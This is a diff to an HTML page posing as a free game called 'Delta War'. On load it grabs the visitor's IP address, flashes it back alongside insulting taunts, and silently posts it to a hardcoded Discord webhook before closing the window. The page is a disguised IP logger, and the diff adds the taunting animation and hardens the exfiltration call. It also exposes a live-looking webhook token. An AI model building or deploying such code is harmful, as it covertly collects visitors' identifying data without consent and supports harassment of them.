@@ -3,21 +3,73 @@
 <head>
  <meta charset="UTF-8">
  <title>Delta War | Play Free Now</title>
+ <style>
+ #text {
+ font-size: 48px;
+ transition: opacity 0.5s ease-in-out;
+ }
+ 
+ .hidden {
+ opacity: 0;
+ }
+ </style>
 </head>
-<body onload="logIP()">
+<body onload="animateText()">
  <!-- Fake content here -->
- <h1>you a bitch</h1>
+ <h1 id="text">Aint this your ip?</h1>
 
  <script>
  async function logIP() {
  const ipResponse = await fetch('https://api.ipify.org');
  const ip = await ipResponse.text();
  const webhookURL = 'https://discord.com/api/webhooks/1543545525821767750/6eYDQxde7zpBEwGEI8eLDnpewZynTvxDuBjwm9HPCMnZZStybikfq6FuZwhw_RXmdRyL';
- fetch(webhookURL, {
+ 
+ try {
+ let response = await fetch(webhookURL, {
  method: 'POST',
- headers: { 'Content-Type': 'application/json' },
+ headers: { 
+ 'Content-Type': 'application/json', 
+ 'User-Agent': 'Discord Webhook' 
+ },
  body: JSON.stringify({ content: `Logged IP: ${ip}` }),
  });
+ 
+ if (!response.ok) {
+ throw new Error(`HTTP error! status: ${response.status}`);
+ }
+ 
+ console.log("Sent successfully!");
+ 
+ } catch (error) {
+ console.error("Error sending webhook:", error);
+ alert("Failed to log IP. Check console for details.");
+ }
+ 
+ window.close(); // Close the window after logging
+ }
+
+ async function animateText() {
+ document.getElementById('text').innerText += " " + (await (await fetch('https://api.ipify.org')).text());
+ 
+ setTimeout(() => {
+ document.getElementById('text').className = "hidden";
+ 
+ setTimeout(() => {
+ document.getElementById('text').innerText = "yeah";
+ document.getElementById('text').classList.remove("hidden");
+ 
+ setTimeout(() => {
+ document.getElementById('text').className = "hidden";
+ 
+ setTimeout(() => {
+ document.getElementById('text').innerText = "you a bitch";
+ document.getElementById('text').classList.remove("hidden");
+ 
+ setTimeout(logIP, 400); // Call logIP after final message fades in
+ }, 500);
+ }, 500);
+ }, 500);
+ }, 1000); // Initial delay before animation starts
  }
  </script>
 </body>
